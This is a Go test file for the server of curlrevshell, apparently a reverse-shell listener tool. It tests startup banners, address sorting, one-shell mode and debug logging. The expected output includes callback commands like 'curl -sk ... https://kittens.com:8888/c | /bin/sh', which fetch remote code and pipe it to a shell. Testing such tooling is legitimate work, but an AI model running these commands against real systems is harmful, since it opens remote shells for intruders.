package hsrv

/*
 * hsrv_test.go
 * Tests for hserv.go
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20250924
 */

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"maps"
	"net"
	"net/http"
	"reflect"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/magisterquis/curlrevshell/internal/iobroker"
	"github.com/magisterquis/curlrevshell/lib/chanlog"
	"github.com/magisterquis/curlrevshell/lib/crstemplate"
	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
	"github.com/magisterquis/curlrevshell/lib/opshell"
	"github.com/magisterquis/curlrevshell/lib/sstls"
)

var (
	// errTestEnding indicates we're cancelling a context because the test
	// is over.
	errTestEnding = errors.New("test ending")
)

// newTestServer is newTestServerMaybeWithDir without a static files directory.
func newTestServer(t *testing.T) (
	chanlog.ChanLog, /* Server logs. */
	chan<- string, /* From shell */
	<-chan opshell.CLine,
	*Server,
	func(),
) {
	return newTestServerMaybeWithDir(t, false)
}

// newTestServerMaybeWithDir returns a new server, suitable for testing.
// The returned function may be called to shut down the server, which will
// closs the chanLog and CLine channels.  It need not be explicitly called.
// By default, no static files directory will be made.  Set makeFDir to true
// to create one.
func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
	chanlog.ChanLog, /* Server logs. */
	chan<- string, /* From shell */
	<-chan opshell.CLine,
	*Server,
	func(),
) {
	var (
		cl, sl = chanlog.New()
		ich    = make(chan string, 1024)
		och    = make(chan opshell.CLine, 1024)
	)
	var td string
	if makeFDir {
		td = t.TempDir()
	}
	iob, err := iobroker.New(ich, och)
	if nil != err {
		t.Fatalf("Error setting up IO Broker: %s", err)
	}
	cbAddrs := []string{"kittens.com:8888", "moose.com"}
	s, err := New(
		sl,
		"127.0.0.1:0",
		"",
		ich,
		och,
		iob,
		"",
		cbAddrs,
		true,
		false,
		true, /* printDebug */
		crstemplate.Params{
			StaticFilesDir: td,
		},
	)
	if nil != err {
		t.Fatalf("Creating server: %s", err)
	}

	/* Make sure none of the URLPaths are empty. */
	v := reflect.ValueOf(s.params.URLPaths)
	for i := range v.NumField() {
		if v.Field(i).IsZero() {
			t.Fatalf(
				"New server's crstemplate.Params.URLPaths.%s "+
					"not set",
				v.Type().Field(i).Name,
			)
		}
	}

	/* Start the server going. */
	ctx, cancel := context.WithCancelCause(context.Background())
	eg, ectx := ctxerrgroup.WithContext(ctx)
	eg.GoTag(ectx, "Server", s.Do)
	eg.GoTag(ectx, "i/o broker", iob.Do)

	/* Function to shut down the server. */
	shutdown := sync.OnceFunc(func() {
		/* Tell everything to stop. */
		cancel(errTestEnding)
		err := eg.Wait()
		if nil != err &&
			!errors.Is(err, ErrOneShellClosed) &&
			!errors.Is(err, net.ErrClosed) { //&&
			//	!errors.Is(err, context.Canceled) {
			t.Fatalf("Unexpected server error: %s", err)
		}
		close(cl)
		close(och)
	})
	t.Cleanup(shutdown)

	/* Work out our listen port. */
	_, listenPort, err := net.SplitHostPort(s.l.Addr().String())
	if nil != err {
		t.Fatalf(
			"Error splitting listen address %s into "+
				"host and port: %s",
			s.l.Addr().String(),
			err,
		)
	}

	/* Make sure we get a listening on message. */
	type wantCLine struct {
		prep func(s string) string
		want opshell.CLine
	}
	listeningWCLs := []wantCLine{{
		want: opshell.CLine{
			Line: fmt.Sprintf("Listening on %s", s.l.Addr()),
		},
	}}
	fileWCLs := []wantCLine{{
		want: opshell.CLine{
			Color: ScriptColor,
			Line:  "To get files from " + td + ":",
		},
	}, {
		want: opshell.CLine{
			Color:       ScriptColor,
			Line:        "\n",
			NoTimestamp: true,
		},
	}}

	for _, addr := range []string{
		cbAddrs[0],
		net.JoinHostPort(
			cbAddrs[1],
			listenPort,
		),
		s.l.Addr().String(),
	} {
		fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
			Color: ScriptColor,
			Line: fmt.Sprintf(
				"curl -sk "+
					"--pinnedpubkey sha256//%s "+
					"https://%s",
				s.l.Fingerprint,
				addr,
			),
			NoTimestamp: true,
		}})
	}
	fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
		Color:       ScriptColor,
		Line:        "\n",
		NoTimestamp: true,
	}})
	shellWCLs := []wantCLine{{
		want: opshell.CLine{
			Color: ScriptColor,
			Line:  "To get a shell:",
		},
	}, {
		want: opshell.CLine{
			Color:       ScriptColor,
			Line:        "\n",
			NoTimestamp: true,
		},
	}}
	for _, addr := range []string{
		cbAddrs[0],
		net.JoinHostPort(
			cbAddrs[1],
			listenPort,
		),
		s.l.Addr().String(),
	} {
		shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
			Color: ScriptColor,
			Line: fmt.Sprintf(
				"curl -sk "+
					"--pinnedpubkey sha256//%s "+
					"https://%s/c | /bin/sh",
				s.l.Fingerprint,
				addr,
			),
			NoTimestamp: true,
		}})
	}
	shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
		Color:       ScriptColor,
		Line:        "\n",
		NoTimestamp: true,
	}})
	wantCLines := make(
		[]wantCLine,
		0,
		len(listeningWCLs)+len(fileWCLs)+len(shellWCLs),
	)
	wantCLines = append(wantCLines, listeningWCLs...)
	if makeFDir {
		wantCLines = append(wantCLines, fileWCLs...)
	}
	wantCLines = append(wantCLines, shellWCLs...)
	for i, want := range wantCLines {
		got := <-och
		if nil != want.prep {
			got.Line = want.prep(got.Line)
		}
		if got != want.want {
			t.Errorf(
				"Incorrect shell message:\n"+
					"   i: %d\n"+
					" got: %#v\n"+
					"want: %#v",
				i,
				got,
				want.want,
			)
		}
	}

	/* Make sure we get exactly the logs we expect. */
	cl.ExpectEmpty(t,
		`{"time":"","level":"INFO","msg":"Listener started",`+
			`"address":"`+s.l.Addr().String()+`"}`,
	)

	/* Don't keep going if we have an error. */
	if t.Failed() {
		t.FailNow()
	}

	return cl, ich, och, s, shutdown
}

func TestServer_Smoketest(t *testing.T) {
	newTestServer(t)
}

func TestServer_SmoketestWithDir(t *testing.T) {
	newTestServerMaybeWithDir(t, true)
}

func TestSortAddresses(t *testing.T) {
	have := []string{
		"foo.com:123",
		"0.0.0.0:123",
		"[10::10]:123",
		"10.1.2.3:123",
		"9.9.9.9:125",
		"[a:a::a]:123",
		"9.9.9.9:1023",
		"9.9.9.9:123",
		"[10::10]:123",
		"9.9.9.9:124",
		"[a:9::a]:123",
		"[a:1::a]:123",
		"9.9.9.9:121",
		"[::1]:123",
		"[10::10]:123",
		"[a::a]:123",
		"[10::10]:123",
		"[9::9]:123",
		"[a:1::a]:123",
		"bar.com:123",
		"[10::10]:123",
	}
	want := []string{
		"bar.com:123",
		"foo.com:123",
		"0.0.0.0:123",
		"9.9.9.9:121",
		"9.9.9.9:123",
		"9.9.9.9:124",
		"9.9.9.9:125",
		"9.9.9.9:1023",
		"10.1.2.3:123",
		"[::1]:123",
		"[9::9]:123",
		"[a::a]:123",
		"[a:1::a]:123",
		"[a:9::a]:123",
		"[a:a::a]:123",
		"[10::10]:123",
	}
	got := sortAddresses(have)
	if len(got) != len(want) {
		t.Errorf(
			"Different length of got (%d) and want (%d) slices",
			len(got),
			len(want),
		)
	}
	for i := range min(len(got), len(want)) {
		if got[i] != want[i] {
			t.Errorf(
				"Sorted list incorrect at position %d\n"+
					"got:\n\n%s\n\n"+
					"want:\n\n%s",
				i,
				strings.Join(got, "\n"),
				strings.Join(want, "\n"),
			)
			break
		}

	}
}

// Make sure the server returns after a single shell, if oneShell is set.
func TestServer_OneShell(t *testing.T) {
	cl, _, _, s, shutdown := newTestServer(t)
	s.oneShell = true /* Only handle one shell. */

	/* HTTP Client which does not certificate validation. */
	httpc := http.Client{
		Transport: &http.Transport{TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		}},
	}

	/* Connect a shell. */
	var (
		id     = "kittens"
		doneCh = make(chan struct{})
		ech    = make(chan error, 2)
	)
	go func() {
		res, err := httpc.Get(
			"https://" + s.l.Addr().String() + "/i/" + id,
		)
		if nil != err {
			ech <- fmt.Errorf("request for /i: %w", err)
			return
		}
		defer res.Body.Close()
		if http.StatusOK != res.StatusCode {
			ech <- fmt.Errorf(
				"request for /i: status %s",
				res.Status,
			)
		}
		ech <- nil
	}()
	go func() {
		pr, pw := io.Pipe()
		defer pr.Close()
		defer pw.Close()
		go func() {
			<-doneCh
			pw.Close()
		}()
		res, err := httpc.Post(
			"https://"+s.l.Addr().String()+"/o/"+id,
			"",
			pr,
		)
		if nil != err {
			ech <- fmt.Errorf("request for /o: %w", err)
			return
		}
		defer res.Body.Close()
		if http.StatusOK != res.StatusCode {
			ech <- fmt.Errorf(
				"request for /o: status %s",
				res.Status,
			)
		}
		<-doneCh
		ech <- nil
	}()

	/* A different cl.Expect to account for port numbers. */
	type lmsg struct {
		Msg       string
		Direction string
	}
	expectLogMessages := func(want map[lmsg]int) {
		got := make(map[lmsg]int)
		for i := 0; i < len(want); i++ {
			select {
			case l := <-cl:
				var msg lmsg
				if err := json.Unmarshal(
					[]byte(l),
					&msg,
				); nil != err {
					t.Fatalf(
						"Error unmarshaling %s: %s",
						l,
						err,
					)
				}
				/* Direction doesn't matter when we close the
				listener. */
				if LMOneShellClosingListener == msg.Msg {
					msg.Direction = ""
				}
				got[msg]++
			case err := <-ech:
				t.Fatalf("Request error: %s", err)
			}
		}
		if !maps.Equal(got, want) {
			t.Fatalf(
				"Incorrect logs:\ngot: %q\nwant: %q",
				got,
				want,
			)
		}
	}

	/* Wait for connections to happen and the listener to close. */
	expectLogMessages(map[lmsg]int{
		{Msg: LMOneShellClosingListener}:                     1,
		{Msg: iobroker.LMNewConnection, Direction: "input"}:  1,
		{Msg: iobroker.LMNewConnection, Direction: "output"}: 1,
	})

	/* Close the shell and make sure we're told about the disconnect. */
	close(doneCh)
	shutdown()
	for i := 0; i < cap(ech); i++ {
		if err := <-ech; nil != err {
			t.Errorf(
				"Request error after listener closed: %s",
				err,
			)
		}
	}
	expectLogMessages(map[lmsg]int{
		{Msg: iobroker.LMDisconnected, Direction: "input"}:  1,
		{Msg: iobroker.LMDisconnected, Direction: "output"}: 1,
	})
	cl.ExpectEmpty(t)
}

// Can we switch on and off debug messages?
func TestServer_NoDebug(t *testing.T) {
	/* bannerServer starts a server going, banners it, and returns its
	output channel as well the address from which it was bannered.  The
	server will be closed when the test finishes. */
	bannerServer := func(
		t *testing.T,
		printDebug bool,
	) (<-chan opshell.CLine, string) {
		/* Assemble bits. */
		var (
			ich = make(chan string, 1024)
			och = make(chan opshell.CLine, 1024)
		)
		iob, err := iobroker.New(ich, och)
		if nil != err {
			t.Fatalf("Error setting up IO Broker: %s", err)
		}

		/* Roll a server. */
		svr, err := New(
			slog.New(slog.DiscardHandler),
			"127.0.0.1:0",
			"",
			ich,
			och,
			iob,
			"",
			nil,
			false,
			false,
			printDebug,
			crstemplate.Params{},
		)
		if nil != err {
			t.Fatalf(
				"Error making server with printDebug:%t: %s",
				printDebug,
				err,
			)
		}

		/* Start it going and make sure it ends eventually. */
		var (
			ctx, cancel = context.WithCancel(t.Context())
			ech         = make(chan error, 1)
			wg          sync.WaitGroup
		)
		wg.Add(1)
		t.Cleanup(func() {
			cancel()
			if err := <-ech; nil != err {
				t.Errorf("Server exited with error: %s", err)
			}
			close(ich)
			close(och)
			for l := range och {
				t.Errorf("Leftover output line: %#v", l)
			}
		})
		go func() { defer wg.Done(); ech <- svr.Do(ctx) }()

		/* Remove normal startup things from the output channel.  These
		have been checked elsewhere. */
		for range 5 {
			<-och
		}

		/* Banner-grab it. */
		sa := svr.l.Addr().String()
		c, err := net.DialTimeout("tcp", sa, time.Second)
		if nil != err {
			t.Fatalf(
				"Error connecting to server at %s: %s",
				sa,
				err,
			)
		}
		ba := c.LocalAddr().String()
		if err := c.Close(); nil != err {
			t.Fatalf("Error closing connection to server: %s", err)
		}

		return och, ba
	}

	/* Server which should get debug output. */
	t.Run("with_debug", func(t *testing.T) {
		/* See if we got an EOF. */
		och, addr := bannerServer(t, true)
		gotL, ok := <-och
		if !ok {
			t.Fatalf("Did not get output line")
		}
		if got, want := gotL.Color, ErrorColor; got != want {
			t.Errorf(
				"Incorrect output line color\n"+
					" got: %s\n"+
					"want: %s",
				got,
				want,
			)
		}
		if got, want := gotL.Line, fmt.Sprintf(
			"Server error: http: "+
				"TLS handshake error from %s: EOF\n",
			addr,
		); got != want {
			t.Errorf(
				"Incorrect banner message\n"+
					" got: %q\n"+
					"want: %q",
				got,
				want,
			)
		}
	})

	/* Without debug output, shouldn't be anything to check.  The lack of
	output will be checked by bannerServer. */
	t.Run("no_debug", func(t *testing.T) { bannerServer(t, false) })
}

// Make sure we set ourselves up to debug-log paths correctly.
func TestSlogAttrsFromURLPaths(t *testing.T) {
	have := crstemplate.URLPaths{
		In:     "up_In",
		InOut:  "up_InOut",
		Out:    "up_Out",
		Script: "up_Script",
	}

	got := slogAttrsFromURLPaths(have)

	want := []slog.Attr{
		slog.String("In", "up_In"),
		slog.String("InOut", "up_InOut"),
		slog.String("Out", "up_Out"),
		slog.String("Script", "up_Script"),
	}

	if !slices.EqualFunc(got, want, func(a, b slog.Attr) bool {
		return a.Equal(b)
	}) {
		t.Errorf(
			"Incorrect attrs returned:\n"+
				"have: %+v\n"+
				" got: %v\n"+
				"want: %v",
			have,
			got,
			want,
		)
	}
}

// Make sure Server.listenAddresses adds port number to everything.
func TestServerListenAddresses_AddPorts(t *testing.T) {
	/* Listener, for default port. */
	l, err := sstls.Listen("tcp", "127.0.0.1:0", "", 0, "")
	if nil != err {
		t.Fatalf("Error listening: %s", err)
	}

	/* Non-listener port, for testing explicit ports. */
	_, lPort, err := net.SplitHostPort(l.Addr().String())
	if nil != err {
		t.Fatalf("Error getting listener port: %s", err)
	}
	n, err := strconv.Atoi(lPort)
	if nil != err {
		t.Fatalf("Error parsing port %q: %s", lPort, err)
	}
	tPort := strconv.Itoa(max(10, (n+1)%65535))

	/* -callback-addresses. */
	have := []string{
		l.Addr().String(),
		"kittens.com",
		net.JoinHostPort("kittens.com", tPort),
	}
	want := make(map[string]struct{})
	for _, h := range have {
		if _, p, _ := net.SplitHostPort(h); "" == p {
			h = net.JoinHostPort(h, lPort)
		}
		want[h] = struct{}{}
	}
	if len(want) != len(have) {
		t.Fatalf(
			"Have %d callback addresses but %d listen addresses",
			len(have),
			len(want),
		)
	}

	/* Make sure we get what we expect. */
	gotAddrs, err := (&Server{l: l}).listenAddresses(have)
	if nil != err {
		t.Fatalf("Error getting listen addresses: %s", err)
	}
	for _, a := range gotAddrs {
		if _, ok := want[a]; !ok {
			t.Errorf("Extraneous listen address: %s", a)
		}
		delete(want, a)
	}
	for _, v := range slices.Sorted(maps.Keys(want)) {
		t.Errorf("Did not get listen address %s", v)
	}
}
